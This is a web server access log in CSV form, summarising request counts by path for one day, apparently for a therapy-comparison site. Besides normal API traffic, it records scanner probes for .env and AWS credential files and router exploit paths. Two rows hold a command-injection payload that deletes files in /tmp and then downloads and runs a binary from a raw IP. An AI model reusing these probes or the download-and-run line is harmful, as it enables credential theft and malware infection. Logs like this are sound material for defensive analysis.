date,status_code,method,url,count
29/Mar/2023,200,GET,/,1
29/Mar/2023,200,GET,/api/amenities-comparison-chart,59
29/Mar/2023,200,GET,/api/auth/session,1
29/Mar/2023,200,GET,/api/auth/signin,38
29/Mar/2023,200,GET,/api/therapy-comparison-chart,32
29/Mar/2023,200,GET,/api/therapy-comparison-chart?filter=inpatient,48
29/Mar/2023,200,GET,/api/therapy-comparison-chart?filter=outpatient,65
29/Mar/2023,200,POST,/api/geolocation,12216
29/Mar/2023,301,GET,/,34
29/Mar/2023,301,GET,/.aws/config,1
29/Mar/2023,301,GET,/.aws/credentials,3
29/Mar/2023,301,GET,/.env,8
29/Mar/2023,301,GET,/.env.prod,1
29/Mar/2023,301,GET,/.env.production,1
29/Mar/2023,301,GET,/.env.project,1
29/Mar/2023,301,GET,/.env.save,1
29/Mar/2023,301,GET,/.git/config,2
29/Mar/2023,301,GET,/.json,1
29/Mar/2023,301,GET,//.env,1
29/Mar/2023,301,GET,/admin/.env,3
29/Mar/2023,301,GET,/app/.env,3
29/Mar/2023,301,GET,/application/.env,1
29/Mar/2023,301,GET,/apps/.env,1
29/Mar/2023,301,GET,/aws/credentials,1
29/Mar/2023,301,GET,/back/.env,1
29/Mar/2023,301,GET,/backend/.env,1
29/Mar/2023,301,GET,/cms/.env,1
29/Mar/2023,301,GET,/cp/.env,1
29/Mar/2023,301,GET,/credentials,1
29/Mar/2023,301,GET,/debug/default/view?panel=config,1
29/Mar/2023,301,GET,/demo/.env,1
29/Mar/2023,301,GET,/development/.env,1
29/Mar/2023,301,GET,/druid/index.html,1
29/Mar/2023,301,GET,/enviroments/.env,1
29/Mar/2023,301,GET,/enviroments/.env.production,1
29/Mar/2023,301,GET,/favicon.ico,1
29/Mar/2023,301,GET,/geoserver/web/,1
29/Mar/2023,301,GET,/info.php,1
29/Mar/2023,301,GET,/local/.env,1
29/Mar/2023,301,GET,/phpinfo,2
29/Mar/2023,301,GET,/portal/redlion,1
29/Mar/2023,301,GET,/private/.env,1
29/Mar/2023,301,GET,/rest/.env,1
29/Mar/2023,301,GET,/script/.env,1
29/Mar/2023,301,GET,/shell?cd+/tmp;rm+-rf+*;wget+5.255.111.128/jaws;sh+/tmp/jaws,1
29/Mar/2023,301,GET,/shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws,1
29/Mar/2023,301,GET,/systembc/password.php,1
29/Mar/2023,301,GET,/web/.env,3
29/Mar/2023,301,HEAD,/Core/Skin/Login.aspx,17
29/Mar/2023,301,POST,/,2
29/Mar/2023,301,POST,/.aws/config,1
29/Mar/2023,301,POST,/.env,3
29/Mar/2023,301,POST,/.env.dist,1
29/Mar/2023,301,POST,/.env.save,1
29/Mar/2023,301,POST,/GponForm/diag_Form?images/,1
29/Mar/2023,301,POST,/api/.env,1
29/Mar/2023,301,POST,/api/v0/id,1
29/Mar/2023,301,POST,/app/.env,2
29/Mar/2023,301,POST,/apps/.env,1
29/Mar/2023,301,POST,/aws/credentials,2
29/Mar/2023,301,POST,/backend/.env,3
29/Mar/2023,301,POST,/boaform/admin/formLogin,4
29/Mar/2023,301,POST,/cms/.env,1
